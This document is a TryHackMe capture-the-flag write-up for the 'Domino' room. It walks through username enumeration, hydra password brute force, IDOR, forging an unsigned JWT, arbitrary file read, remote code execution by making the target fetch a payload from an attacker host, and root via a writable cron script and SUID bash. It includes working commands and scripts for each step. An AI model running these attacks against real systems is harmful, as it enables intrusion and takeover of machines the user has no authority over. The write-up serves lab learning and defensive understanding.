---
type: writeup
platform: TryHackMe
room: Domino
os: Linux
environment: Web Application / Linux
last_verified: 2026-09-28

techniques:
  - username-enumeration
  - password-brute-force
  - idor
  - jwt-forgery
  - broken-jwt-verification
  - arbitrary-file-read
  - remote-code-execution
  - credential-reuse
  - cron-abuse
  - suid-abuse

tools:
  - curl
  - hydra
  - openssl
  - hashcat
  - ssh
  - pspy
  - python3
---
**Attack path:** Employee enumeration → weak web credentials → IDOR → broken JWT verification → admin access → arbitrary file read → remote file execution → `www-data` → credential reuse → SSH as `devops` → writable root-executed script → SUID Bash → root

## 1. Reconnaissance

Initial enumeration identified two relevant services:

```bash
22/tcp  SSH
80/tcp  HTTP
```

The web server was Apache on Ubuntu.

HTTP became the primary initial attack surface, while SSH remained interesting if valid operating-system credentials were discovered later.

The application exposed a NexusCorp authentication portal using:

```http
POST /index.php

username=
password=
```

The username placeholder indicated a naming convention similar to:

```bash
firstname.lastname
```

Two public pages were immediately useful:

```bash
/team.php
/forgot.php
```

---

## 2. Employee and Username Enumeration

`/team.php` exposed employee names such as:

```bash
Laura Hayes
Michael Chen
Sarah Johnson
Robert Wilson
Emma Taylor
David Brown
James Wright
```

Combined with the known username convention, these names produced likely accounts such as:

```bash
laura.hayes
robert.wilson
sarah.johnson
```

The password-reset endpoint provided a way to confirm them.

For an existing username such as:

```bash
laura.hayes
```

the application returned a reset confirmation.

For an invalid username, it returned:

```bash
No account found with that username.
```

The different responses confirmed a **username-enumeration vulnerability**.

The application therefore exposed both the employee names and a reliable method for determining which derived usernames actually existed.

---

## 3. Content Discovery and Backup Disclosure

Web content discovery exposed several interesting locations:

```bash
/admin/
/api/
/backup/
/support/
/static/

/auth.php
/config.php
/dashboard.php
```

The exact historical enumeration command was not preserved. An equivalent discovery approach would be:

```bash
gobuster dir \
  -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt
```

The most interesting directory was:

```bash
/backup/
```

Directory listing was enabled and exposed:

```bash
README.txt
config.enc
```

The README explained that `config.enc` used:

```bash
AES-128-ECB
```

and pointed to:

```bash
/static/app.js
```

for the encryption key.

The JavaScript contained the backup key and explicitly documented that it had to be padded to 16 bytes with NULL bytes.

Because AES-128 requires a 16-byte key, the discovered value could be converted into the raw hexadecimal form expected by OpenSSL.

The backup was then decrypted with:

```bash
openssl enc \
  -d \
  -aes-128-ecb \
  -K <REDACTED_KEY_HEX> \
  -in config.enc
```

The decrypted configuration disclosed:

```json
{
  "deploy_env": "production",
  "system_user": "devops"
}
```

The important discovery was:

```bash
system_user = devops
```

At this point, `devops` was only a likely Linux account. No operating-system credential had yet been confirmed.

---

## 4. Weak Web Credentials

With confirmed usernames available, authentication testing was performed against `robert.wilson`:

```bash
hydra \
  -l robert.wilson \
  -P /usr/share/wordlists/rockyou.txt \
  <TARGET_IP> \
  http-post-form \
  "/index.php:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -f -V
```

A valid password was recovered:

```bash
Username: robert.wilson
Password: <REDACTED>
```

The same weak password was later observed on multiple employee accounts, indicating weak password practices and password reuse.

### Hydra False Positive

Hydra later appeared to identify an empty password for another user.

That result was manually tested:

```bash
curl -i \
  -c laura_cookies.txt \
  -d 'username=laura.hayes&password=' \
  http://<TARGET_IP>/index.php
```

Authentication had **not** succeeded.

The problem was the Hydra failure matcher:

```bash
F=Invalid credentials
```

Hydra treated the absence of that exact string as success, even though the application had returned a different failure response.

A stronger success condition would have been based on the authenticated redirect:

```bash
S=Location\: /dashboard.php
```

This is an important distinction: automated authentication results should be manually validated before being treated as confirmed credentials.

---

## 5. Authenticated Session

Robert's credential was validated manually:

```bash
curl -i \
  -c cookies.txt \
  -d 'username=robert.wilson&password=<REDACTED>' \
  http://<TARGET_IP>/index.php
```

Successful authentication returned:

```http
HTTP/1.1 302 Found
Location: /dashboard.php
```

and created a cookie named:

```bash
nexus_session
```

Its payload contained approximately:

```json
{
  "user_id": 4,
  "username": "robert.wilson",
  "role": "user"
}
```

Because the role appeared client-side, changing:

```json
"role": "user"
```

to:

```json
"role": "admin"
```

was tested while keeping the original signature.

The application rejected the modified session.

Simple session-cookie tampering was therefore not sufficient.

Later source-code analysis confirmed that the session cookie's HMAC was validated and that the application reloaded the user's role from the database.

---

## 6. API Discovery and IDOR

The authenticated dashboard referenced several API endpoints:

```bash
/api/auth/token.php
/api/users/profile.php?id=
/api/files.php?name=
```

A JWT could be obtained using Robert's authenticated session:

```bash
curl -s \
  -b cookies.txt \
  http://<TARGET_IP>/api/auth/token.php
```

For convenience:

```bash
TOKEN=$(
  curl -s \
    -b cookies.txt \
    http://<TARGET_IP>/api/auth/token.php |
  python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])'
)
```

The JWT payload contained approximately:

```json
{
  "sub": "robert.wilson",
  "role": "user",
  "iat": "...",
  "exp": "..."
}
```

Robert's profile was accessible through:

```bash
/api/users/profile.php?id=4
```

Because the identifier was numeric, another object was requested:

```bash
curl \
  -b cookies.txt \
  http://<TARGET_IP>/api/users/profile.php?id=1
```

The server returned another employee's data, including the administrator profile.

This confirmed **IDOR / BOLA**:

```text
Robert is authenticated
        ↓
Robert requests another user's object
        ↓
server returns it without object-level authorization
```

The first room flag was exposed through the administrator data:

```bash
THM{REDACTED}
```

---

## 7. JWT Authorization Testing

The file API was tested with Robert's legitimate JWT:

```bash
curl \
  -H "Authorization: Bearer $TOKEN" \
  "http://<TARGET_IP>/api/files.php?name=test"
```

The response indicated:

```bash
Admin JWT required
```

This showed that authorization for the endpoint depended on information from the JWT.

The token used:

```bash
HS256
```

so the first hypothesis was that the signing secret might be weak.

The token was saved:

```bash
echo "$TOKEN" > jwt.txt
```

and tested against `rockyou.txt`:

```bash
hashcat \
  -m 16500 \
  jwt.txt \
  /usr/share/wordlists/rockyou.txt
```

Result:

```bash
Recovered: 0/1
```

The previously discovered backup encryption key was also tested as a possible reused JWT secret, but it did not work.

Rather than continuing an arbitrary brute-force attempt, the next question became:

> Does the application actually verify the JWT signature?

---

## 8. Forging an Administrator JWT

A token was constructed with:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

and an administrator payload:

```json
{
  "sub": "robert.wilson",
  "role": "admin"
}
```

One reproducible way to create it was:

```bash
NONE_TOKEN=$(python3 - <<'PY'
import base64
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).decode().rstrip("=")

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "sub": "robert.wilson",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

print(f"{b64url(header)}.{b64url(payload)}.")
PY
)
```

The forged token was tested:

```bash
curl \
  -H "Authorization: Bearer $NONE_TOKEN" \
  "http://<TARGET_IP>/api/files.php?name=test"
```

Instead of:

```bash
Admin JWT required
```

the application began processing the requested filename.

The forged administrative role was therefore accepted.

### Actual Vulnerability

At first, this looked like a classic `alg:none` vulnerability.

Later source-code disclosure showed that the actual flaw was broader: the JWT verification function decoded the payload while the signature comparison logic was disabled.

Conceptually:

```php
$payload = decode_token_payload();

// signature calculation existed
// signature comparison was disabled

return $payload;
```

The correct finding was therefore:

```text
JWT signature verification disabled
```

rather than simply:

```text
alg:none accepted
```

Any suitably structured, unexpired token containing an administrative role could be trusted because the signature was not actually enforced.

---

## 9. Web Administrator Access

The forged token was tested directly against the administration interface:

```bash
curl -i \
  -H "Authorization: Bearer $NONE_TOKEN" \
  http://<TARGET_IP>/admin/
```

Response:

```http
HTTP/1.1 200 OK
```

The administrator console was returned.

It still displayed:

```bash
Logged in as: robert.wilson
```

so the authenticated identity remained Robert, while authorization was elevated through the forged JWT.

The second room flag was exposed:

```bash
THM{REDACTED}
```

---

## 10. Arbitrary File Read

The administrator file API accepted a user-controlled `name` parameter.

An application file was requested:

```bash
curl \
  -H "Authorization: Bearer $NONE_TOKEN" \
  --get \
  --data-urlencode 'name=/var/www/html/config.php' \
  http://<TARGET_IP>/api/files.php
```

The server returned its contents.

The configuration exposed values including:

```bash
DB_HOST
DB_NAME
DB_USER
DB_PASS
JWT_SECRET
APP_SECRET
```

The actual secrets are redacted.

The database password was particularly interesting because its value was strongly related to the previously discovered account:

```bash
system_user = devops
DB_PASS = <REDACTED>
```

At this stage, this was only a **credential-reuse hypothesis**.

A database password cannot be considered a Linux password until authentication is actually tested.

---

## 11. Source-Code Review

The same file-read primitive was used to inspect:

```bash
/var/www/html/auth.php
```

This confirmed several earlier observations:

- the session cookie used HMAC-SHA256;
- session-cookie integrity was verified;
- the application reloaded roles from the database;
- JWTs were generated using HS256;
- JWT signature verification was disabled.

The local file branch also used:

```php
file_get_contents($real);
```

after resolving the path with:

```php
realpath()
```

and constraining it to:

```bash
/var/www/html/
```

The resulting primitive was therefore better described as **Arbitrary File Read / Local File Disclosure**, not classic PHP LFI.

The application read the files as data; it did not include them through `include()` or `require()`.

---

## 12. Remote File Handling → RCE

The same endpoint handled values beginning with:

```bash
http://
https://
```

through logic approximately equivalent to:

```php
$remote = file_get_contents($name);

eval(
    str_replace(
        "<?php",
        "",
        $remote
    )
);
```

The server therefore:

```text
downloads attacker-controlled remote content
        ↓
passes that content to eval()
        ↓
executes it as PHP
```

This provided direct server-side code execution through remote attacker-controlled content.

A minimal payload was created first:

```bash
cat > payload.txt <<'EOF'
echo "COMMAND OUTPUT:\n";
system("id");

echo "\nFLAG:\n";
echo file_get_contents("/opt/flag3.txt");
EOF
```

No `<?php` opening tag was required because the vulnerable application itself passed the downloaded content to `eval()`.

The payload was served:

```bash
python3 -m http.server 8000
```

and requested through the vulnerable endpoint:

```bash
curl -i \
  -H "Authorization: Bearer $NONE_TOKEN" \
  --get \
  --data-urlencode 'name=http://<ATTACKER_IP>:8000/payload.txt' \
  http://<TARGET_IP>/api/files.php
```

The response included:

```bash
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirmed **Remote Code Execution** as:

```bash
www-data
```

The third room flag was also accessible:

```bash
/opt/flag3.txt
```

```bash
THM{REDACTED}
```

Using `id` first established the execution context without immediately introducing the complexity of a reverse shell.

---

## 13. Credential Reuse → SSH as `devops`

Two independent pieces of information were now available:

```bash
system_user = devops
```

and:

```bash
DB_PASS = <REDACTED>
```

Because SSH was exposed on port `22`, the database password was tested against the `devops` account:

```bash
ssh devops@<TARGET_IP>
```

Authentication succeeded.

Only after this successful authentication could credential reuse be confirmed:

```text
database credential
        ↓
reused as
        ↓
Linux account password
```

The new context was verified:

```bash
whoami
id
pwd
ls -la
```

```bash
devops
```

The user's home directory contained the fourth room flag:

```bash
THM{REDACTED}
```

---

## 14. Linux Privilege-Escalation Enumeration

Initial checks were:

```bash
whoami
id
groups
sudo -l
```

`devops` had no useful sudo permissions.

SUID binaries were then enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Only standard binaries such as the following stood out:

```bash
passwd
su
sudo
mount
umount
```

No immediately useful custom SUID binary was found.

Linux capabilities were checked next:

```bash
getcap -r / 2>/dev/null
```

Again, no immediately exploitable abnormal capability was discovered.

Cron configuration was inspected:

```bash
find /etc/cron* \
  -type f \
  -maxdepth 2 \
  -ls 2>/dev/null

cat /etc/crontab
cat /etc/cron.d/* 2>/dev/null
```

Systemd timers were also reviewed:

```bash
systemctl list-timers --all
```

None of these checks immediately exposed the privilege-escalation path.

---

## 15. Writable Root-Owned Files

Custom files under `/opt` were inspected:

```bash
ls -la /opt

find /opt \
  -maxdepth 3 \
  -type f \
  -ls 2>/dev/null
```

Two interesting files appeared:

```bash
/opt/admin_bot.py
/opt/monitoring/health_report.sh
```

The monitoring script was owned by `root`, but its group permissions allowed `devops` to modify it.

Its permissions were equivalent to:

```bash
-rwxrwxr-- root devops health_report.sh
```

A more targeted search confirmed writable root-owned files:

```bash
find / \
  -xdev \
  -type f \
  -user root \
  -writable \
  2>/dev/null
```

Relevant results:

```bash
/opt/monitoring/health_report.sh
/opt/admin_bot.py
```

A writable root-owned file is suspicious, but it is **not sufficient by itself** for privilege escalation.

The missing condition was:

> Does a privileged process actually execute the writable file?

---

## 16. Understanding the Admin Bot

Inspecting:

```bash
sed -n '1,260p' /opt/admin_bot.py
```

also explained an earlier web-testing observation.

The bot extracted HTTP URLs from support messages using a regular expression similar to:

```python
url_pat = r"https?://[A-Za-z0-9./_?&=:%+-]+"
urls = re.findall(url_pat, msg)
```

and fetched them with:

```python
requests.get(url, cookies=COOKIE, timeout=5)
```

The bot was therefore effectively:

```text
URL extractor
+
HTTP client
```

rather than a browser.

Earlier HTTP callbacks from attempted blind-XSS testing therefore did **not** prove JavaScript execution.

This is an important distinction: a callback proves that a resource was requested, not that a browser executed client-side code.

---

## 17. Confirming Root Execution with `pspy`

The machine contained:

```bash
/opt/tools/pspy64
```

It was executed as the unprivileged user:

```bash
/opt/tools/pspy64
```

`pspy` revealed periodic processes running as UID `0`:

```bash
UID=0 ... /usr/sbin/CRON
UID=0 ... /bin/sh -c /opt/monitoring/health_report.sh
UID=0 ... /bin/bash /opt/monitoring/health_report.sh
```

This supplied the missing evidence:

```text
devops can modify health_report.sh
+
root periodically executes health_report.sh
=
arbitrary command execution as root
```

The writable script was now a confirmed privilege-escalation primitive.

---

## 18. Root Privilege Escalation

Before modifying the script, a backup was created:

```bash
cp \
  /opt/monitoring/health_report.sh \
  ~/health_report.sh.bak
```

A command was then appended:

```bash
echo \
  'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' \
  >> /opt/monitoring/health_report.sh
```

When the root cron job executed the script, it performed:

```bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
```

The first command created a root-owned copy of Bash.

The second added the SUID bit.

After the scheduled execution:

```bash
ls -l /tmp/rootbash
```

showed approximately:

```bash
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The `s` in the owner's execute position confirmed that SUID was set.

The shell was then started with:

```bash
/tmp/rootbash -p
```

The `-p` option preserved Bash's privileged effective identity.

Verification:

```bash
id
whoami
```

showed:

```bash
euid=0(root)
```

Root access was achieved.

The final room flag was located at:

```bash
/root/root.txt
```

```bash
THM{REDACTED}
```

---

## Cleanup

The original monitoring script could be restored:

```bash
cp \
  /home/devops/health_report.sh.bak \
  /opt/monitoring/health_report.sh
```

The SUID Bash copy should also be removed:

```bash
rm /tmp/rootbash
```

In a real engagement, cleanup should follow the agreed Rules of Engagement and every modification should be documented.

---

## Key Takeaways

- Employee information becomes much more valuable when combined with a predictable username convention and an account-enumeration oracle.
- Automated authentication tools can produce false positives when success or failure conditions are poorly defined; interesting credentials should be manually validated.
- IDOR/BOLA is an authorization failure, not an authentication failure: a legitimate user was able to retrieve another user's object by changing its identifier.
- A working `alg:none` token does not necessarily mean the root cause is specifically an `alg:none` implementation bug. Source review showed that JWT signature verification was disabled entirely.
- `file_get_contents()` used for local files provides file disclosure, not PHP inclusion. The remote branch became code execution only because downloaded content was explicitly passed to `eval()`.
- A discovered application credential is only a credential-reuse hypothesis until authentication against another service actually succeeds.
- Writable root-owned files are not automatically privilege-escalation vulnerabilities. The critical additional condition is privileged execution of attacker-controlled content.
- `pspy` can provide the runtime evidence needed to connect a writable script to a privileged scheduled process.